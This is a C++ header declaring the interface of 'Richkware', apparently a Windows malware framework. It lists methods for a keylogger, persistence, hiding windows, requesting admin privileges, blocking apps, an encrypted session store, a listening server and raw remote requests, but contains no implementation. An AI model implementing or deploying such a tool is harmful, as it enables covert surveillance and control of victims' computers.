/*
 *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
 */

#ifndef RICHKWARE_H_
#define RICHKWARE_H_

#ifndef _WIN32_WINNT
#define _WIN32_WINNT  0x501
#endif

#define MAX_THREAD 8

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <winbase.h>
#include <windef.h>
#include <winerror.h>
#include <winnt.h>
#include <winreg.h>
#include <winuser.h>

#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>
#include <cstring>
#include <string>
#include <iterator>
#include <list>
#include <map>

#include "crypto.h"
#include "sharedList.h"
#include "thread.h"
#include "blockApps.h"

class Richkware {
private:
	std::map<std::string, std::string> session;
	std::string AppName;

	void SaveValueReg(const char* path, const char* key, const char* value);
	std::string LoadValueReg(const char* path, const char* key);
	void SaveValueToFile(const char* value, const char* path = NULL);
	std::string LoadValueFromFile(const char* path = NULL);

	void SaveSession(const char* EncryptionKey);
	void LoadSession(const char* EncryptionKey);
	
public:
	const char* EncryptionKey;
	BlockApps blockApps;

	void SaveInfo(const char* key, const char* value);
	std::string FindInfo(const char* key);
	void RemoveInfo(const char* key);
	
	BOOL IsAdmin();
	void RequestAdminPrivileges();
	void Persistance();
	void StealthWindow(const char* window);
	void OpenApp(const char* app);
	void Keylogger(const char* fileName);
	bool CheckSession();
	bool CheckPersistance();
	void Initialize(const char* AppName, const char* EncryptionKey);

	int StartServer(const char* port, const char* EncryptionKey = NULL);
	const char* RawRequest(const char * serverAddress, const char* port, const char* request);
	
	void Hibernation();
	void RandMouse();

};

#endif /* RICHKWARE_H_ */
